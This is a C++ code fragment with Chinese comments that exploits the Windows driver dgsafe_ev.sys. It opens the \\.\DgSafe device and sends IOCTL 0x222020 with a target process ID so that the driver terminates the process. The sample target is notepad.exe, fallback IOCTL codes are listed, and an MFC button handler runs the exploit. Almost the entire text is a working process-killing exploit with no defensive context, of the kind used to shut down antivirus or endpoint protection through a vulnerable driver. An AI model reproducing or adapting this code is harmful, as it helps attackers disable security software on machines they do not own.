// DgSafeExploit.h / .cpp 片段

#include <windows.h>
#include <winioctl.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DEVICE_PATH_DGSAFE L"\\\\.\\DgSafe"
#define IOCTL_KILL_DGSAFE  0x222020

// 辅助函数（同上，可复用）
DWORD GetProcessIdByName(const wchar_t* processName);

// 针对 dgsafe_ev.sys 的利用函数
bool ExploitDgSafeKillProcess() {
    // 1. 打开驱动设备
    HANDLE hDevice = CreateFileW(DEVICE_PATH_DGSAFE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] 打开设备 %s 失败，错误码 %d\n", DEVICE_PATH_DGSAFE, GetLastError());
        return false;
    }

    // 2. 获取目标进程 PID
    DWORD pid = GetProcessIdByName(L"notepad.exe");
    if (pid == 0) {
        wprintf(L"[!] 未找到 notepad.exe。\n");
        CloseHandle(hDevice);
        return false;
    }

    // 3. 发送 IOCTL
    DWORD bytesReturned = 0;
    BOOL bResult = DeviceIoControl(hDevice, IOCTL_KILL_DGSAFE,
        &pid, sizeof(pid),
        NULL, 0,
        &bytesReturned, NULL);

    DWORD lastError = GetLastError();
    CloseHandle(hDevice);

    if (bResult) {
        wprintf(L"[+] dgsafe_ev.sys: IOCTL 0x%08X 成功，进程已终止。\n", IOCTL_KILL_DGSAFE);
        return true;
    } else {
        wprintf(L"[-] dgsafe_ev.sys: IOCTL 失败，错误码 %d\n", lastError);
        // 可尝试备用：0x222030, 0x222038
        return false;
    }
}

// MFC 按钮事件（例如 IDC_BTN_DGSAFE）
void CYourDlg::OnBnClickedBtnDgSafe() {
    ExploitDgSafeKillProcess();
}